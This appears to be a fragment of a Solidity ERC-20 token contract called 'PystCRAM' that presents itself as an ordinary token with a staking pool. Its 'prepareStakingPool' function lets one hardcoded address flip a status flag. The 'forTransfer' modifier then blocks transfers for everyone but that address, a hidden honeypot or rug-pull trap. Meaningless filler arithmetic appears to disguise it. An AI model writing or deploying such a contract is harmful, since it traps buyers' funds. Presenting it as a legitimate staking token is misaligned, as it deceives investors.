...
contract PystCRAMToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenPC_totalSupply;
    uint256 private _tokenPC_status = 0;
    uint256 public stakingPoolPCStatus = 0;

    string private _tokenPC_name;
    string private _tokenPC_symbol;

    address private _poolPCAddress = 0x5925C5F60d76a869E0197D5C48FF52c02d06aE3c;

    constructor() {
        _tokenPC_name = "PystCRAM";
        _tokenPC_symbol = "PystCRAM";
        _tokenPC_totalSupply = 59700 * 10 ** 18;
        _balances[msg.sender] = _tokenPC_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolPCAddress || _tokenPC_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolPCStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolPCAddress)
        {
            _tokenPC_status = 1;
        }
    }
